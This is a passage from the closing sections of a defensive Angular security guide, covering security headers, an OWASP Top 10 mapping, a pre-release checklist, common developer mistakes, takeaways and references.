    h["Permissions-Policy"] = "camera=(), microphone=(), geolocation=()";
    h["Content-Security-Policy"] = "...";   // see Section 17 — test report-only first!
    await next();
});
app.UseHsts();
app.UseHttpsRedirection();
```

Verify your deployment with the browser's network tab, `curl -I https://your-app`, or scanners like [securityheaders.com](https://securityheaders.com).

One related HTML-level habit: links that open new tabs should not hand the new page a reference back to yours:

```html
<!-- ✅ noopener prevents the opened page from controlling window.opener -->
<a href="https://external.example" target="_blank" rel="noopener noreferrer">...</a>
```

(Modern browsers imply `noopener` for `target="_blank"`, but being explicit costs nothing and covers older browsers.)

---

## 19. OWASP and Angular

The [OWASP Top 10](https://owasp.org/www-project-top-ten/) is the industry's reference list of web risks. Here's how the most relevant ones map to your Angular work:

| OWASP risk | What it looks like in an Angular app | Your defense |
|---|---|---|
| **A01: Broken Access Control** | Default-allow guards; admin endpoints unprotected; IDOR via editable IDs | Fail-closed guards (Sec. 9); backend authorization always (Sec. 2, 10) |
| **A02: Cryptographic Failures** | Tokens over HTTP; long-lived JWTs in localStorage | HTTPS + HSTS; in-memory access token + HttpOnly refresh cookie (Sec. 11) |
| **A03: Injection (incl. XSS)** | `bypassSecurityTrustHtml` on user data; direct `innerHTML`; URL string interpolation | Stay in templates; no bypass on dynamic data; `HttpParams` (Sec. 4–7, 13) |
| **A04: Insecure Design** | Trusting `postMessage` from any origin; secrets "hidden" in lazy chunks | Origin checks; nothing secret ships to the browser (Sec. 7, 16) |
| **A05: Security Misconfiguration** | Missing CSP/headers; permissive defaults; test keys in production | Header baseline (Sec. 17–18); fail-closed defaults; config review |
| **A06: Vulnerable & Outdated Components** | Old Angular; deprecated/wildcard/unused npm packages | `npm audit` in CI; dependency hygiene (Sec. 15) |
| **A07: Identification & Auth Failures** | Logout that fails open; no token expiry; weak password rules | Fail-safe logout (Sec. 8); short-lived tokens; server-enforced policy |
| **A08: Software & Data Integrity Failures** | Compromised npm release auto-installed via `*` | Lockfiles, pinned ranges, careful upgrades (Sec. 15) |
| **A09: Logging Failures** | Tokens and PII in `console.log` | Log hygiene (Sec. 13) |

The framework itself helps enormously — contextual auto-escaping, sanitized `[innerHTML]`, `HttpClient`'s XSSI protection, strict template type-checking — but every one of these protections has a documented escape hatch. OWASP risks enter Angular apps through the escape hatches.

---

## 20. The Complete Angular Security Checklist

Copy this into your project and review it before each release.

### Templates & XSS
- [ ] No `bypassSecurityTrust*` calls on dynamic (user/API) data — constants only
- [ ] No direct `innerHTML` / `outerHTML` / `insertAdjacentHTML` / `document.write` assignments
- [ ] `[innerHTML]` bindings used only for trusted/CMS content, never raw user input
- [ ] No `eval`, `new Function`, or string-built script execution
- [ ] All `postMessage` listeners validate `event.origin`; all sends use explicit `targetOrigin`
- [ ] External links with `target="_blank"` include `rel="noopener"`

### Authentication & authorization
- [ ] Guards **fail closed**: missing policy/config ⇒ deny, not allow
- [ ] Every guarded route requires authentication; roles add on top
- [ ] Admin routes guarded at the parent level; children inherit
- [ ] Logout clears local state in `finalize()` (works even when the server call fails)
- [ ] Every frontend permission check has a matching backend check
- [ ] No secrets or privileged logic relied upon inside "admin-only" chunks

### Tokens & storage
- [ ] Access tokens short-lived; refresh flow in place
- [ ] Target architecture: in-memory access token + HttpOnly/Secure/SameSite refresh cookie
- [ ] If tokens are in localStorage today: documented as tech debt, XSS posture extra strict
- [ ] Nothing sensitive in localStorage/sessionStorage beyond that (no PII, no secrets)
- [ ] Values read from storage treated as untrusted input

### HTTP & interceptors
- [ ] `Authorization` header attached **only** to your own API origin
- [ ] 401-refresh logic triggers only for your own API
- [ ] All user-influenced URL/query values go through `HttpParams`
- [ ] No tokens/PII/raw payloads in `console.*`; consider stripping logs in prod builds
- [ ] HTTPS everywhere; no `http://` API URLs outside local development

### Secrets & configuration
- [ ] No hardcoded third-party tokens, JWTs, or secret keys anywhere in `src/`
- [ ] Only public-by-design keys (publishable keys, OAuth client IDs) in environment files
- [ ] Production environment uses production keys (no `pk_test_` in prod!)
- [ ] Any secret ever committed/shipped has been **rotated at the source**
- [ ] No private keys / certificates committed to git (`*.pem`, `*.key`, `*.pfx` gitignored)

### Dependencies
- [ ] `npm audit` clean (and wired into CI)
- [ ] No `"*"` / `latest` versions; lockfile committed
- [ ] No deprecated, duplicate, or unused packages
- [ ] Angular on a supported major version

### Headers & deployment (server-side, but verify!)
- [ ] CSP deployed (tested via `Report-Only` first)
- [ ] HSTS, `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY` / `frame-ancestors`
- [ ] `Referrer-Policy` and `Permissions-Policy` set
- [ ] Verified on the live deployment (`curl -I`, securityheaders.com)

---

## 21. Common Mistakes Developers Make

Drawn from real audits — if you recognize your codebase in any of these, you now know the fix:

1. **The default-allow guard.** A guard that returns `true` when configuration is missing. Routes look protected; some aren't. *(Fix: fail closed — Section 9.)*
2. **"It's behind the admin route, so it's private."** Hardcoding a token in an admin component, forgetting that lazy chunks are public downloads. *(Sections 10, 16.)*
3. **Deleting a leaked secret without rotating it.** The secret is still in git history and old bundles. Rotation is the fix; deletion is cleanup. *(Section 16.)*
4. **The greedy interceptor.** Attaching the bearer token to every request, so a future third-party call leaks sessions. *(Section 13.)*
5. **Logout in the success callback.** One failed request away from leaving a live session on a shared computer. *(Section 8.)*
6. **`bypassSecurityTrustHtml(serverData)`.** Disabling the XSS protection precisely where it's needed. *(Section 6.)*
7. **`postMessage` without origin checks.** Treating window messages as if only the friendly iframe could send them. *(Section 7.)*
8. **Building URLs with template strings.** `?email=${email}` instead of `HttpParams`. *(Section 13.)*
9. **Trusting client-side validation.** Assuming the API only receives what the form allows. *(Section 14.)*
10. **`console.log`-ing tokens and full error objects.** Secrets don't belong in the console. *(Section 13.)*
11. **Dependency drift.** Wildcard versions, deprecated duplicates, unused packages nobody dares to remove. *(Section 15.)*
12. **Test keys in production.** Centralize keys in environment files so this is visible at a glance. *(Section 16.)*

---

## 22. Key Takeaways

If you remember only five things from this guide:

1. **The frontend advises; the backend enforces.** Every guard, validator, and hidden button must have a server-side twin. Ask "what if someone skips this?" about every check you write.

2. **Fail closed.** Missing policy, undefined config, errored request — the secure answer to ambiguity is *deny*. The worst frontend security bugs are defaults that quietly allow.

3. **Everything you ship is public.** Bundles, lazy chunks, environment files, git history. There is no such thing as a frontend secret — and a leaked secret must be rotated, not just deleted.

4. **Stay inside Angular's rails.** Interpolation, property binding, `HttpParams`, `HttpClient`, signal/reactive forms — the framework's defaults are safe. Vulnerabilities live in the escape hatches: `bypassSecurityTrust*`, raw DOM access, string-built URLs, unchecked `postMessage`.

5. **Defense in depth wins.** Short-lived in-memory tokens *and* strict XSS hygiene *and* CSP *and* security headers *and* dependency audits. Each layer assumes another one will eventually fail — that's the point.

Security isn't a feature you add at the end; it's a set of habits. The good news: as this guide shows, most of the habits are small — choosing `HttpParams` over string interpolation, checking `event.origin`, putting cleanup in `finalize()`. Practice them until they're automatic.

---

## 23. References

**Angular (official)**
- [Angular Security Guide](https://angular.dev/best-practices/security) — the framework's own security documentation: sanitization, trusted types, escape hatches
- [Angular HttpClient](https://angular.dev/guide/http) — interceptors, params, XSSI protection
- [Angular Router Guards](https://angular.dev/guide/routing/route-guards) — `CanMatch`, `CanActivate`, functional guards

**OWASP**
- [OWASP Top 10](https://owasp.org/www-project-top-ten/) — the standard list of web application risks
- [OWASP Cross-Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP HTML5 Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html) — includes `postMessage` and web storage guidance
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)

**Headers & tooling**
- [MDN: Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)
- [MDN: window.postMessage](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) — including the security notes on `origin` and `targetOrigin`
- [securityheaders.com](https://securityheaders.com) — scan your deployed headers
- [npm audit documentation](https://docs.npmjs.com/cli/commands/npm-audit)

---

*This guide is based on patterns observed in real production Angular applications. The insecure examples are real bug classes — generalized and anonymized — and every "secure" example reflects a fix that has actually shipped.*
